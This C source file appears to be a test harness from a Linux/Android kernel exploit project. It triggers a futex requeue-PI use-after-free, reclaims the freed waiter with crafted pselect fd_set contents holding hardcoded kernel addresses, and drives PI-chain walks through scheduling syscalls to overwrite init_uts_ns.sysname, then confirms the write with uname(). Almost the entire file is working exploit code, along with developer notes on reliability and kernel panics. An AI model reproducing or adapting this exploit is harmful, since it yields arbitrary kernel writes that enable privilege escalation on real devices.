/**
 * ghostlock_uts_oracle.c — EDEADLK + pselect reclaim + 非 CFI uname oracle
 *                          + 多 consumer 矩阵
 *
 * 目标:
 *   1) 写目标换为 init_uts_ns.name.sysname（非 ashmem fops）
 *   2) 用 uname() 检测 8B store（marker "GLORACLE"）
 *   3) 轮换 consumer: sched_setattr / setpriority / nice / sched_setscheduler / LOCK_PI
 *
 * residual.lock = empty_zero_page 直映（全 0 → wait_lock trylock 可过）[试验]
 * residual.task = init_task (kimage, slide=0 on #245)
 *
 * 常量来自 target.h [BIN]；禁止盲扫 SHIFT（固定 +15）。
 *
 * env:
 *   PI_CONSUMER=sched_setattr|setpriority|nice|sched_setscheduler|futex_lock_pi|all
 *   SKIP_PSELECT=1 — 仅 EDEADLK + consumer（对照）
 *   SKIP_CONSUMER=1 — 只 reclaim，测 uname（不 walk）
 *
 * 设备笔记 2026-07-26: empty_zero_page 作 lock 时 pselect 可成功，
 * consumer walk 易 kernel_panic（UAF live，但 craft 不如 spray fake_lock 稳）。
 * 稳定 UTS oracle 请用 exploit: WRITE_ORACLE=uts
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

/* --- target.h [BIN] subset (Leaf5 #245, slide=0) --- */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#define INIT_TASK_OFF 0x0379c180ULL
#define INIT_UTS_NS_OFF 0x0379bf28ULL
#define EMPTY_ZERO_PAGE_OFF 0x039ed000ULL
#define UTS_NAME_SYSNAME_OFF 0x4
#define UTS_ORACLE_MARKER_LE 0x454c4341524f4c47ULL /* "GLORACLE" LE */
#define PSELECT_WAITER_WORD_SHIFT 15
#define FAKE_WAITER_PRIO 0x82

#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)

static uint64_t data_addr(uint64_t image_addr) {
  uint64_t off = image_addr - KIMAGE_TEXT_BASE;
  uint64_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

static uint64_t text_addr(uint64_t image_addr) { return image_addr; }

#ifndef PSELECT_ROUTE_NFDS
#define PSELECT_ROUTE_NFDS 640
#endif

static uint32_t f_wait __attribute__((aligned(64)));
static uint32_t f_pi_target __attribute__((aligned(64)));
static uint32_t f_pi_chain __attribute__((aligned(64)));
static uint32_t cons_pi __attribute__((aligned(64)));

static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int owner_on_chain;
static atomic_int wait_returned;
static atomic_int reclaim_done;
static atomic_int all_done;
static atomic_int waiter_tid;
static atomic_int requeue_errno_a;
static atomic_int wait_errno_a;

static long futex_op(uint32_t *uaddr, int op, uint32_t val, const void *timeout,
                     uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static long sched_setattr_tid(int tid, int nice_v) {
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint32_t sched_period;
    uint32_t sched_util_min;
    uint32_t sched_util_max;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = nice_v;
  return syscall(274, tid, &attr, 0);
}

static void sample_sysname(char *buf, size_t n) {
  struct utsname u;
  if (uname(&u) != 0) {
    snprintf(buf, n, "?errno=%d", errno);
    return;
  }
  snprintf(buf, n, "%s", u.sysname);
}

static int uts_hit(const char *before, const char *after) {
  if (!after || !after[0])
    return 0;
  if (before && strcmp(before, after) != 0)
    return 1;
  if (strncmp(after, "Linux", 5) != 0)
    return 1;
  if (after[0] == 'G' && after[1] == 'L' && after[2] == 'O')
    return 1;
  return 0;
}

/* Match exploit/src/fops.c: store full word into fd_set bit array. BITS=64 only. */
static void fdset_put_word(fd_set *s, int word, uint64_t val) {
  unsigned long *bits = (unsigned long *)s;
  int max_words = (int)(sizeof(fd_set) / sizeof(unsigned long));
  if (word < 0 || word >= max_words)
    return;
  bits[word] = (unsigned long)val;
}

static int pselect_words_per_set(void) {
  int bpw = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bpw - 1) / bpw;
}

static void pselect_put_waiter_word(fd_set *in, fd_set *out, fd_set *ex,
                                    int waiter_word, uint64_t val) {
  int wps = pselect_words_per_set();
  int global_word = waiter_word + PSELECT_WAITER_WORD_SHIFT;
  if (global_word < 0)
    return;
  int set_idx = global_word / wps;
  int word_idx = global_word % wps;
  switch (set_idx) {
  case 0:
    fdset_put_word(in, word_idx, val);
    break;
  case 1:
    fdset_put_word(out, word_idx, val);
    break;
  case 2:
    fdset_put_word(ex, word_idx, val);
    break;
  default:
    printf("[W] cannot place waiter_word=%d global=%d wps=%d\n", waiter_word,
           global_word, wps);
    break;
  }
}

static void run_pselect_reclaim(void) {
  uint64_t target = data_addr(INIT_UTS_NS) + UTS_NAME_SYSNAME_OFF;
  uint64_t value = UTS_ORACLE_MARKER_LE;
  uint64_t lock_ptr = data_addr(EMPTY_ZERO_PAGE);
  uint64_t task_ptr = text_addr(INIT_TASK);
  uint64_t parent = (target >= 8) ? ((target - 8) | 1ull) : 1ull;
  uint64_t right = 0;
  uint64_t left = value;

  printf("[W] reclaim target(uts.sysname)=%016llx value=%016llx lock(zero)=%016llx "
         "task=%016llx parent=%016llx\n",
         (unsigned long long)target, (unsigned long long)value,
         (unsigned long long)lock_ptr, (unsigned long long)task_ptr,
         (unsigned long long)parent);

  int pipefd[2];
  if (pipe(pipefd) != 0) {
    printf("[W] pipe errno=%d\n", errno);
    return;
  }

  fd_set in, out, ex;
  FD_ZERO(&in);
  FD_ZERO(&out);
  FD_ZERO(&ex);
  /* paint waiter words 0-9 (corrupts fd bits — must open_selected_fds after) */
  pselect_put_waiter_word(&in, &out, &ex, 0, parent);
  pselect_put_waiter_word(&in, &out, &ex, 1, right);
  pselect_put_waiter_word(&in, &out, &ex, 2, left);
  pselect_put_waiter_word(&in, &out, &ex, 3, parent);
  pselect_put_waiter_word(&in, &out, &ex, 4, right);
  pselect_put_waiter_word(&in, &out, &ex, 5, left);
  pselect_put_waiter_word(&in, &out, &ex, 6, task_ptr);
  pselect_put_waiter_word(&in, &out, &ex, 7, lock_ptr);
  pselect_put_waiter_word(&in, &out, &ex, 8, (uint64_t)FAKE_WAITER_PRIO);
  pselect_put_waiter_word(&in, &out, &ex, 9, 0);

  /* Same as exploit fops.c open_selected_fds — avoid EBADF on painted bits */
  int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    printf("[W] F_DUPFD errno=%d\n", errno);
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }
  /* Never clobber stdin/out/err — painted words often set low bits. */
  for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, &in) || FD_ISSET(fd, &out) || FD_ISSET(fd, &ex))
      dup2(high_read, fd);
  }
  /* Clear bits 0-2 so kernel does not EBADF on stdio */
  FD_CLR(0, &in);
  FD_CLR(1, &in);
  FD_CLR(2, &in);
  FD_CLR(0, &out);
  FD_CLR(1, &out);
  FD_CLR(2, &out);
  FD_CLR(0, &ex);
  FD_CLR(1, &ex);
  FD_CLR(2, &ex);
  close(high_read);
  dup2(pipefd[0], PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, &ex);

  struct timespec ts = {.tv_sec = 0, .tv_nsec = 80 * 1000 * 1000};
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
  printf("[W] pselect ret=%d errno=%d\n", ret, errno);
  close(pipefd[0]);
  close(pipefd[1]);
}

static void run_consumers(int tid) {
  const char *cons = getenv("PI_CONSUMER");
  if (!cons || !*cons)
    cons = "all";
  printf("[C] PI_CONSUMER=%s tid=%d\n", cons, tid);

  if (!strcmp(cons, "all") || !strcmp(cons, "sched_setattr")) {
    for (int i = 0; i < 8; i++) {
      errno = 0;
      long r = sched_setattr_tid(tid, 1 + (i % 15));
      printf("[C] sched_setattr i=%d ret=%ld errno=%d\n", i, r, errno);
      usleep(2000);
    }
  }
  if (!strcmp(cons, "all") || !strcmp(cons, "setpriority")) {
    errno = 0;
    long r = setpriority(PRIO_PROCESS, tid, 5);
    printf("[C] setpriority ret=%ld errno=%d\n", r, errno);
  }
  if (!strcmp(cons, "all") || !strcmp(cons, "nice")) {
    errno = 0;
    int r = nice(1);
    printf("[C] nice ret=%d errno=%d\n", r, errno);
  }
  if (!strcmp(cons, "all") || !strcmp(cons, "sched_setscheduler")) {
    struct sched_param sp = {0};
    errno = 0;
    long r = sched_setscheduler(tid, SCHED_OTHER, &sp);
    printf("[C] sched_setscheduler ret=%ld errno=%d\n", r, errno);
  }
  if (!strcmp(cons, "all") || !strcmp(cons, "futex_lock_pi")) {
    errno = 0;
    long r = futex_op(&cons_pi, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[C] futex_LOCK_PI ret=%ld errno=%d\n", r, errno);
    if (r == 0)
      futex_op(&cons_pi, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  }
}

static void *waiter_thread(void *arg) {
  (void)arg;
  atomic_store(&waiter_tid, (int)syscall(SYS_gettid));
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started))
    usleep(500);

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 3;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  atomic_store(&wait_errno_a, errno);
  atomic_store(&wait_returned, 1);
  printf("[W] WAIT ret=%ld errno=%d\n", r, errno);

  if (!getenv("SKIP_PSELECT") || strcmp(getenv("SKIP_PSELECT"), "1"))
    run_pselect_reclaim();
  else
    printf("[W] SKIP_PSELECT=1\n");
  atomic_store(&reclaim_done, 1);

  usleep(300000);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&all_done, 1);
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&waiter_ready))
    usleep(500);
  atomic_store(&owner_started, 1);
  atomic_store(&owner_on_chain, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&all_done))
    usleep(10000);
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static void *consumer_thread(void *arg) {
  (void)arg;
  for (int i = 0; i < 1000 && !atomic_load(&reclaim_done); i++)
    usleep(5000);
  if (getenv("SKIP_CONSUMER") && !strcmp(getenv("SKIP_CONSUMER"), "1")) {
    printf("[C] SKIP_CONSUMER=1\n");
    return NULL;
  }
  int tid = atomic_load(&waiter_tid);
  if (tid > 0)
    run_consumers(tid);
  return NULL;
}

int main(void) {
  char before[65], after[65];
  setvbuf(stdout, NULL, _IONBF, 0);
  sample_sysname(before, sizeof(before));
  printf("ghostlock_uts_oracle — non-CFI uname + multi-consumer\n");
  printf("uname.sysname before='%s'\n", before);

  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot, ct;
  pthread_create(&wt, NULL, waiter_thread, NULL);
  pthread_create(&ot, NULL, owner_thread, NULL);
  pthread_create(&ct, NULL, consumer_thread, NULL);

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_on_chain))
    usleep(1000);
  usleep(80000);

  errno = 0;
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)(uintptr_t)1,
                     &f_pi_target, f_wait);
  atomic_store(&requeue_errno_a, errno);
  printf("[M] CMP_REQUEUE_PI ret=%ld errno=%d\n", rr, errno);

  for (int i = 0; i < 800 && !atomic_load(&all_done); i++)
    usleep(10000);

  pthread_join(wt, NULL);
  pthread_join(ct, NULL);
  pthread_join(ot, NULL);

  sample_sysname(after, sizeof(after));
  int hit = uts_hit(before, after);
  printf("\n=== SURVIVED requeue_errno=%d wait_errno=%d ===\n",
         atomic_load(&requeue_errno_a), atomic_load(&wait_errno_a));
  printf("uname.sysname after='%s' UTS_ORACLE_HIT=%d\n", after, hit);
  return hit ? 0 : 1;
}
